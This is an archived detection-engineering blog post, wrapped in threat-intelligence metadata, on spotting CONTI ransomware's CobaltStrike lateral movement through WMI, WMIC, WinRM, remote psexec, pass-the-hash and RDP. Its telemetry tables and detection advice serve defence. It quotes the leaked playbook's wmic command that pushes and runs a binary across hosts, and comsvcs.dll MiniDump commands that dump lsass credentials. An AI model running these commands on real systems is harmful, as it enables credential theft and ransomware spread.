{
    "id": "bbc36a76-9679-4f43-a117-cf131dd6dc31",
    "created_at": "2023-01-12T15:05:10.524414Z",
    "updated_at": "2025-03-27T02:09:29.682255Z",
    "deleted_at": null,
    "sha1_hash": "64b36c4357ce9dd6485cc7f3918bcb49b668d064",
    "title": "2021-11-02 - Detecting CONTI CobaltStrike Lateral Movement Techniques - Part 2",
    "authors": "",
    "file_creation_date": "2022-05-27T23:03:09Z",
    "file_modification_date": "2022-05-27T23:03:09Z",
    "file_size": 1753807,
    "plain_text": "# Detecting CONTI CobaltStrike Lateral Movement Techniques - Part 2\n\n**unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-**\ntechniques-part-2\n\nDetecting CONTI CobaltStrike Lateral Movement Techniques - Part 2\n\nDetection opportunities on lateral movement techniques used by CONTI ransomware group\nusing CobaltStrike.\n\nIntroduction\n\nIn this second and last part of detecting CONTI lateral movement techniques I will go through\nthe rest of CobaltStrike's built-in capabilities documented in the CONTI leak.\n\nIn the first blog post I tried to cover the `jump command capabilities and detection`\nopportunities where we compared them to some built-in windows utilities.\n\nFor the first part, please visit : Detecting CONTI CobaltStrike Lateral Movement Techniques Part 1\n\nT1047 : Windows Management Instrumentation\n\nA primer to WMI\n\n**WMI is Microsoft's implementation of Web-Based Enterprise Management (WBEM) which**\nis an industry initiative to develop a standard technology for accessing management\ninformation in an enterprise environment and CIM (Common Information Model) which is an\nopen standard from the Distributed Management Task Force (DMTF). CIM provides a\ncommon definition of management information for systems, networks, applications, and\nservices.\n\n**WMI can be used over** `RPC/WinRM protocol or` `RPC/DCOM . In this introduction I will be`\nfocusing on RPC/DCOM.\n\nData in WMI is grouped into WMI classes. WMI classes are then grouped into WMI\nnamespaces. Most of the WMI classes exist under the root\\cimv2 WMI namespace.\n\nIn summary each Namespace contains Classes which have:\n\n**Methods : Actions that can be taken.**\n\n\n-----\n\n**Properties : Information that can be retrieved.**\n\n**Instances : Instances of the class objects (services, Processes, Disks) each instance**\nwith Methods and Properties.\n\n**Events : Actions that WMI can monitor for and take action when they happen.**\n\nWMI Namespace Structure\n\nWMI leverages DCOM server and client interfaces to communicate over the network\nbetween Windows Management Instrumentation Remote Protocol clients and servers.\n\nWhen it comes to lateral movement one of my favorite data sources to check first is Zeek.\nUpon running the simulated lateral movement attack using CobaltStrike built-in command\n```\nremote-exec wmi, the following telemetry was generated by Zeek.\n\n```\n\n-----\n\nWMI Remoting Telemetry from Zeek\n```\nzeek.dce_rpc.endpoint column values are the interfaces while\nzeek.dce_rpc.operation are the methods defined in WMI and DCOM documentations.\n\n```\nThis is very helpful in order to understand how WMI looks like from a network perspective.\nZeek can identify these GUIDs related to IWbem interfaces. A full list is documented in\n[GitHub source code here.](https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek)\n\nSample of Zeek's supported IWbem interfaces\n\n**IObjectExporter::ServerAlive : First we can see RPC binding information calls to the**\n```\n   IObjectExporter interface using methods ServerAlive or ServerAlive2 to\n\n```\ndetermine server aliveness. Deciding the method is related to the `COMVERSION in use.`\n\n\n-----\n\n**IRemoteSCMActivator::RemoteCreateInstance : The DCOM client MUST support**\nthe `Activation and` `OXID Resolution DCOM mechanisms for creating and`\nresolving object references. `Activation mechanism can be achieved through two`\ninterfaces and three different methods, `IActivation::RemoteActivation,`\n```\n   IRemoteSCMActivator::RemoteCreateInstance, or\n   IRemoteSCMActivator::RemoteGetClassObject .\n\n```\n**IRemUnknown2::RemQueryInterface : Every object can be bound to one or multiple**\ninterfaces. An Object reference counter is used to keep track of a Component Object\nModel (COM) objects. For acquiring additional interfaces on the object\n```\n   IRemUnknown::RemQueryInterface and IRemUnknown2::RemQueryInterface\n\n```\ncalls are used.\n\nAn object reference is represented on the wire by a marshaled form called `OBJREF .`\n\n**IWbemLevel1Login::NTLMLogin : According to MS-WMI documentation, during**\nprotocol initialization, The client MUST call the `IWbemLevel1Login::NTLMLogin`\nmethod.\n\n**IWbemServices::ExecMethod : This call will return an interface pointer to**\n```\n   IWbemServices management services where methods like GetObject which\n\n```\nretrieves a CIM class or a CIM instance and `ExecMethod which executes a CIM`\nmethod that is implemented by a CIM class or a CIM instance, can be used.\n\n**IRemUnknown2::RemRelease : The release sequence is then called to decrement**\nthe reference counter\n\nBellow is a mind-map where I tried to summarize the different interfaces and method used\nduring WMI remote calls. This will help understand the telemetry recorded by Zeek in order\nto identify the best calls to focus our detections on.\n\n\n-----\n\nMind Map of WMI Interfaces & Methods\n\nAs stated in the MS-WMI documentation, during protocol initialization, the client MUST call\nthe `IWbemLevel1Login::NTLMLogin method. This is a good indication of WMI usage over`\nthe network. However, a good baseline of users and assets with authorization to use WMI\naccompanied with a well defined change management process will significantly improve your\ndetection success rate. `IWbemServices::ExecMethod and` `IWbemServices::GetObject`\ncalls are also good indications of WMI accessing web-based management services.\n\nZeek Telemetry:\n\nLog File\n\nEndpoint\n\nOperation\n\n**DCE-RPC**\n\nIWbemLevel1Login\n\n```\nNTLMLogin\n\n```\n\n**DCE-RPC**\n\nIWbemServices\n\n\n-----\n\n```\nGetObject\n\n```\n\n**DCE-RPC**\n\nIWbemServices\n\n```\nExecMethod\n\n```\n\nRemote-Exec wmi Command\n\nCobaltStrike has a built-in lateral movement module called `remote-exec which supports`\nthree commands : `wmi,` `winrm, and` `psexec . Remote-Exec module is used to execute a`\ncommand on a host remotely and doesn't pop a beacon unless it is used for that particular\npurpose by first uploading a script or a beacon file then execute it via remote-exec\ncommands and use `link or` `connect commands to assume control of the target.`\n\nIn this section I will be exploring some generated telemetries from the endpoint perspective\nusing `wmi command.`\n```\n   wmiprvse.exe process is spawned with the command line\n   C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding and\n\n```\nparent command line `C:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch .`\n\nSysmon EID 1 WmiPrvSE.exe\n\nEID `5857 was generated to report the start of WMI provider` `cimwin32.dll . There`\nare several WMI providers. This is not very useful because WMI usage can be\nverbose.\n\nWMI Provider started EID 5857\n\nThe command is executed within the context of `*WmiPrvSE.exe* .`\n\n\n-----\n\nwmiprvse.exe spawning sysinfo.exe\n\nwmiprvse.exe process tree\n\nBy default, WMI uses a randomly selected dynamic port range for TCP between\n```\n   49152 and 65535 .\n\n```\nEID\n\nAction\n\nProvider\n\nComment\n\n\n-----\n\n1\n\nProcess Creation\n\nMicrosoft-Windows-Sysmon\n\nProcess Name : `wmiprvse.exe`\n\nProcess Command Line : `C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -`\n```\n   Embedding or C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding\n\n```\nParent Process Name : `svchost.exe`\n\nParent Process Command Line : `C:\\Windows\\system32\\svchost.exe -k`\n```\n   DcomLaunch\n\n```\n1\n\nProcess Creation\n\nMicrosoft-Windows-Sysmon\n\nParent Process Name: `wmiprvse.exe`\n\nLogonID : Is not `0x3E7 (not a LocalSystem account)`\n\n3\n\nNetwork Connection\n\nMicrosoft-Windows-Sysmon\n\nNetwork Direction : `ingress`\n\nImage : `C:\\Windows\\system32\\svchost.exe`\n\nSource port : `>= 49152`\n\nSource IP : is not `127.0.0.1 and not` `::1`\n\nDetecting malicious usage of WMI relies heavily on WmiPrvse.exe abnormal child processes\nbehavior. However, some approaches can be taken to improve your detections. For example\nif you have a SCCM server, you might consider whitelisting the following paths in your\n[process command arguments (Reference):](https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html)\n1\n\nC:\\\\Windows\\\\CCM\\\\SystemTemp\\\\\n\n\n-----\n\n2\n\nC:\\\\Windows\\\\CCMCache\\\\\n\n3\n\nC:\\\\CCM\\\\\\\\Cache\\\\\n\nCopied!\n\nKeep in mind that attackers might still abuse these paths to evade detections so baselining\nyour assets, source IPs and users that are allowed to use WMI remotely is recommended to\nincrease detection resilience.\n\nBy default only Local Administrators or Domain Admins can read WMI class information so in\norder to further refine your access control policies you can limit regular users permissions by\nadding them to the Distributed COM Users group and the Performance Monitor Users group.\n\nWMIC\n\nIn the leaked CONTI documentation, we noticed a lot of wmic.exe usage for remote\ncommand execution across multiple assets. For example, they use a batch file called\nWMI.BAT with the following command to spread a binary file across multiple hosts.\n\n1\n\nstart wmic /node:@C:\\\\share$\\\\comps1.txt /user:\"DOMAIN\\\\Administrator\"\n/password:\"PASSWORD\" process call create \"cmd.exe /c bitsadmin /transfer fx166\n\\\\\\\\ДОМЕН КОНТРОЛЛЕР\\\\share$\\\\fx166.exe\n%APPDATA%\\\\fx166.exe&%APPDATA%\\\\fx166.exe\"\n\nCopied!\n\nOr interact with beacon through `shell command to dump credentials :`\n\n1\n\nshell wmic /node:[target] process call create \"cmd /c rundll32.exe\nC:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump PID C:\\\\ProgramData\\\\lsass.dmp full\"\n\nCopied!\n\n**WMIC.EXE is one of the Windows built-in utilities that leverages WMI protocol for command**\nexecution. For detection opportunities we can look for :\n\n\n-----\n\nFrom source point of view, process command line arguments `process` `call`\n```\n   create and for WMI remoting we can add the argument /node . You can use\n\n```\n[@wietze](https://twitter.com/Wietze) [Windows Command Line Obfuscation project to validate command line](https://github.com/wietze/windows-command-line-obfuscation)\nvariations for more resilient detections based on process creation events.\n\nwmic windows command obfuscation capabilities\n\nEID `4648 A logon was attempted using explicit credentials where the process`\nname is `svchost.EXE and service class` `RPCSS* . This event is a good DFIR artifact`\nfor differentiating between the original account and the account specified in the wmic\ncommand (In my case I didn't specify any credentials).\n\nEID 4648 for WMIC.EXE usage\n\nA service principal name (SPN) is the name by which a Kerberos client uniquely identifies an\ninstance of a service for a given Kerberos target computer. There are multiple SPN\nregistrations :\n\n\n-----\n\n```\n   HTTP/hostname.contoso.com like when using PowerShell Remoting via Enter   PSSession\n   WSMAN/hostname.contoso.com like when using WinRM for Remoting\n   CIFS/hostname.contoso.com like when using PsExec\n   HOST/hostname.contoso.com for any service running on the computer with\n\n```\nhostname `HOSTNAME`\n\nThe RPCSS service is the Service Control Manager for COM and DCOM servers. It performs\nobject activations requests, object exporter resolutions and distributed garbage collection for\n[COM and DCOM servers (source). HOST service can also be used for remotely executing](https://www.blackviper.com/windows-services/remote-procedure-call-rpc/)\n[commands on the target system via WMI (source).](https://adsecurity.org/?p=2011)\n\nHOST Service used for remote WMI execution\n\nOn the destination, as previously explained, looking for abnormal behavior of\n```\n   WmiPvSE.exe like spawning PowerShell.exe and Cmd.exe with suspicious\n\n```\narguments would be effective. (see previous table Endpoint for more details)\n\n\n-----\n\nwmiprvse.exe spawning system shells\n\nThe table bellow displays WMIC related telemetry generated from the source host :\n\nEID\n\nAction\n\nProvider\n\nComment\n\n1\n\nProcess Creation\n\nMicrosoft-Windows-Sysmon\n\nProcess Name : `wmic.exe`\n\nProcess Arguments : `/node,` `process,` `call, and` `create`\n\n3\n\nNetwork Connection\n\nMicrosoft-Windows-Sysmon\n\nNetwork Direction : `egress`\n\nImage : `C:\\Windows\\system32\\wbem\\wmic.exe`\n\nSource port : `>= 49152`\n\nSource IP : is not `127.0.0.1 and not` `::1`\n\n4648\n\n\n-----\n\nAuthentication\n\nMicrosoft-Windows-Security-Auditing\n\nAdditional Information : `RPCSS/*`\n\nProcess Name : `C:\\Windows\\System32\\svchost.exe`\n\n4648\n\nAuthentication\n\nMicrosoft-Windows-Security-Auditing\n\nAdditional Information : `host/*`\n\nProcess Name : `C:\\Windows\\System32\\wbem\\wmic.exe`\n\nSigma Rules\n\nThe following rules present some ideas about detecting malicious WMI behavior.\n\n[sigma/sysmon_wmi_susp_scripting.yml at master · SigmaHQ/sigmas-](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/wmi_event/sysmon_wmi_susp_scripting.yml)\nsigma/process_creation_lolbins_with_wmiprvse_parent_process.yml at master ·\nSigmaHQ/sigma\nsigma/process_creation_office_applications_spawning_wmi_commandline.yml at\nmaster · SigmaHQ/sigma\n[sigma/win_susp_wmic_proc_create_rundll32.yml at master · SigmaHQ/sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_wmic_proc_create_rundll32.yml)\n[sigma/win_susp_wmic_security_product_uninstall.yml at master · SigmaHQ/sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_wmic_security_product_uninstall.yml)\n[sigma/win_susp_wmi_execution.yml at master · SigmaHQ/sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml)\n[sigma/win_wmiprvse_spawning_process.yml at master · SigmaHQ/sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_wmiprvse_spawning_process.yml)\n\nDetection Validation\n\nAtomic Red Team provides a good resource to test your WMI detections\n\n[atomic-red-team/T1047.md at master · redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md)\n\nEDR Testing Script :\n\n_Test the accuracy of Endpoint Detection and Response (EDR) software with simple_\n_script which executes various ATT&CK/LOLBAS/Invoke-CradleCrafter/Invoke-_\n_DOSfuscation payloads_\n\n\n-----\n\nGitHub - op7ic/EDR-Testing-Script: Test the accuracy of Endpoint Detection and\n[Response (EDR) software with simple script which executes various](https://github.com/op7ic/EDR-Testing-Script)\nATT&CK/LOLBAS/Invoke-CradleCrafter/Invoke-DOSfuscation payloads\n\nDFIR\n\nTo provide more details about the WMI activity for your DFIR engagements, you can use\nETW. To enable the event tracing of WMI, you can use the command line:\n\n1\n\nPS C:\\> wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true\n\nCopied!\n\nBe aware that ETW was made for debugging and enabling WMI event tracing features might\ngenerate a lot of data which will be stopped after reaching a certain size/duration limit.\n\nReferences\n\n[Tracing WMI Activity - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity)\n[Investigating WMI Attacks](https://www.sans.org/blog/investigating-wmi-attacks/)\n\nT1021.006 Remote Services: Windows Remote Management\n\nRemote-Exec WINRM Command\n```\nremote-exec winrm command is similar to jump winrm64 in command execution under\n\n```\nthe context of wmsprovhost.exe except that it was not made for creating and maintaining a\nremote session hence `wsmprovhost.exe terminates after execution.`\n\n\n-----\n\nremote-exec winrm target process tree\n\n**_Generated telemetry on the destination :_**\n\nEID\n\nAction\n\nProvider\n\nComment\n\n1\n\nWSMan Session Creation\n\nMicrosoft-Windows-Sysmon\n\nProcess Name : `wsmprovhost.exe`\n\nProcess CMD : `C:\\Windows\\system32\\wsmprovhost.exe -Embedding`\n\nProcess Parent Name : `svchost.exe`\n\nProcess Parent CMD : `C:\\Windows\\system32\\svchost.exe -k DcomLaunch`\n\n3\n\nWSMan Session Creation\n\nMicrosoft-Windows-Sysmon\n\n\n-----\n\nNetwork Direction: ingress\n\nProcess Name: System\n\nDestination port : 5985 or 5986\n\nUser : NT `AUTHORITY\\SYSTEM`\n\n17\n\nPipe Created\n\nMicrosoft-Windows-Sysmon\n\nNetwork Direction: egress\n\nInfected Source Process Name\n\nDestination port : 5985 or 5986\n\nPipe Name : `\\PSHost.[%NUMBERS%].`\n```\n      [%PID%].DefaultAppDomain.wsmprovhost\n\n```\nProcess Name : `wsmprovhost.exe`\n\n4656\n\nProcess Access\n\nMicrosoft-Windows-Security-Auditing\n\nObject Server : WS-Management Listener\n\nProcess Name : `C:\\Windows\\System32\\svchost.exe`\n\n400\n\nPowerShell Session Start\n\nPowerShell\n\nHost Name = `ServerRemoteHost` (Remote PowerSehll Session)\n\nEngine Version (Good for Downgrading PS attacks)\n\nHost Application : `C:\\Windows\\system32\\wsmprovhost.exe -Embedding`\n\n91\n\n\n-----\n\nWSMan Session Creation\n\nMicrosoft-Windows-WinRM\n\n31\n\nWSMan Session Creation\n\nMicrosoft-Windows-WinRM\n\nWSMan Session Created Successfully\n\n142\n\nWSMan Operation Failure\n\nMicrosoft-Windows-WinRM\n\nHelpful when WinRM is not enabled on the targeted host\n\nT1570 : Lateral Transfer Tool\n\nRemote-Exec PSEXEC Command\n```\nremote-exec psexec command creates and start a service remotely with random Service\n\n```\nName and the passed on command as Service File Name. The main difference between this\nfeature and `jump psexec or` `jump psexec64 is that` `remote-exec psexec does not`\ngenerate a service executable and upload it to the target. As noticed before, CobaltStrike's\nservice file spawns `rundll32.exe with no arguments which is suspicious.`\n\nremote-exec psexec command target process creation\n\n\n-----\n\nMonitoring `services.exe child process for malicious behavior like spawning system shells`\n```\ncmd.exe and powershell.exe or other discovery binaries like whoami.exe,\nsysteminfo.exe, net.exe,...etc would be effective against this type of attack.\n\n```\nremote-exec psexec process tree\n\n\n-----\n\nEID 7045 Event Details\n\nIn the CONTI leaked documentation, the playbook shows the usage of this module to dump\n```\nlsass.exe memory via comsvcs.dll\n\n```\n1\n\nremote-exec psexec [target] cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll,\nMiniDump PID C:\\\\ProgramData\\\\lsass.dmp full\n\nCopied!\n\nDetection Rule\n\nThis detection rule from Elastic should be enough to detect such behavior.\n\n[System Shells via Services | Elastic Security Solution [7.15] | Elastic](https://www.elastic.co/guide/en/security/current/system-shells-via-services.html)\n\nSee [previous blog for more details on CobaltStrike](https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-1) `psexec built-in capabilities detection.`\n\n\n-----\n\nT1550.002 Use Alternate Authentication Material: Pass the Hash\n\nPTH\n\nAs defined by MITRE in ATT&CK framework:\n\n_Adversaries may \"pass the hash\" using stolen password hashes to move laterally_\n_within an environment, bypassing normal system access controls. Pass the hash (PtH)_\n_is a method of authenticating as a user without having access to the user's cleartext_\n_password. This method bypasses standard authentication steps that require a cleartext_\n_password, moving directly into the portion of the authentication that uses the password_\n_hash._\n\nCobaltStrike has a built-in module called `pth to perform pass-the-hash attack using`\nMimikatz's `sekurlsa:pth module. As stated by CobaltStrike creator himself this is not`\nOpSec safe since it presents low hanging detection opportunities for defenders.\n\nCobaltStrike PTH command\n\nPTH module has a hardcoded command that contains suspicious sequence of arguments\nsuch as `*cmd.exe` `/c` `echo` `>` `\\\\.\\\\pipe\\* . Monitoring process creation events`\nwith such arguments would be effective against CobaltStrike's way of implementing and\nautomating pass-the-hash attack. Keep in mind attackers can always use Mimikatz **PTH**\nmodule where they can change these properties.\n\n\n-----\n\nPTH process creation event arguments\n\nAnother key event for detecting pass the hash is `EID 4624 with logon type` `9`\n(NewCredentials), logon process `seclogo and Authentication Package` `Negotiate .`\n\n\n-----\n\nDetecting PTH using EID 4624\n\nPTH detection observations :\n\nEID\n\nAction\n\nProvider\n\nComment\n\n1\n\nProcess Creation\n\nMicrosoft-Windows-Sysmon\n\nProcess Name : cmd.exe\n\nProcess Arguments : `/c,` `echo,` `>, and` `\\\\.\\pipe*`\n\n\n-----\n\n4624\n\nAuthentication\n\nMicrosoft-Windows-Security-Auditing\n\nLogon Type : `9`\n\nLogon Process : `seclogo`\n\nAuthentication Package : `Negotiat e`\n\nSigma Rules\n\nDetection Validation\n\n[atomic-red-team/T1550.002.md at master · redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md)\n\nT1021.001 Remote Services: Remote Desktop Protocol\n\nRDP\n\nThe CONTI leaked documentation shows RDP being used several time for manual access\nwhether to dump `lsass process memory using task manager or export credentials from`\nusers profiles and keyloggers data. This is not an exploitation of the RDP service itself since\nthe attacker already got their hands on user's credentials, so in this case maintaining a good\nRDP users policy will help creating a baseline and detecting related violations. EID `4825` **A**\n**user was denied the access to Remote Desktop can be helpful in this matter.**\n\nI previously created this mind map for RDP DFIR **Authentication event logs that can be**\nobserved in your environment when using RDP with and without NLA enabled.\n\nThe mind map was pushed to a great GitHub project started by Andrew Rathbun\n[(@bunsofwrath12)](https://twitter.com/bunsofwrath12) [here. The RDP mind map can be found following this link :](https://github.com/AndrewRathbun/DFIRMindMaps)\n\nDFIRMindMaps/OSArtifacts/Windows/RDP_Authentication_Artifacts at main ·\nAndrewRathbun/DFIRMindMaps\n\nGitHub\n\nGitHub Project Repository\n\nRDP_DFIR.pdf\n\n\n-----\n\n76KB\n\nPDF\n\nRDP DFIR Authentication Event Logs PDF\n\n\n-----\n\nRDP DFIR Authentication Event Logs Image\n\nReferences\n\n\n-----\n\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/dfce8f131ae2-4cd3-aadd-03edf6290407\nhttps://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows[Management-Instrumentation-WMI-To-Build-A-Persistent Asynchronous-And-Fileless-](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)\nBackdoor-wp.pdf\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/38d52a831613-4c56-8418-12ad1145eeaa?redirectedfrom=MSDN\nhttps://github.com/KPN-CISO/Network-Detection/blob/master/Lateral\nMovement/WMI/WMI_README.md\nhttps://www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-withpowershell-part-1-what-it-is.html\n[https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek](https://github.com/zeek/zeek/blob/master/scripts/base/protocols/dce-rpc/consts.zeek)\n[http://files.brucon.org/2019/06-Catching-WMI-Lateral-Movement.pdf](http://files.brucon.org/2019/06-Catching-WMI-Lateral-Movement.pdf)\n[https://www.youtube.com/watch?v=f67CHOj7OrY](https://www.youtube.com/watch?v=f67CHOj7OrY)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-02 - Detecting CONTI CobaltStrike Lateral Movement Techniques - Part 2.pdf"
    ],
    "report_names": [
        "2021-11-02 - Detecting CONTI CobaltStrike Lateral Movement Techniques - Part 2.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535910,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653692589,
    "ts_modification_date": 1653692589,
    "files": {
        "pdf": "https://archive.orkl.eu/64b36c4357ce9dd6485cc7f3918bcb49b668d064.pdf",
        "text": "https://archive.orkl.eu/64b36c4357ce9dd6485cc7f3918bcb49b668d064.txt",
        "img": "https://archive.orkl.eu/64b36c4357ce9dd6485cc7f3918bcb49b668d064.jpg"
    }
}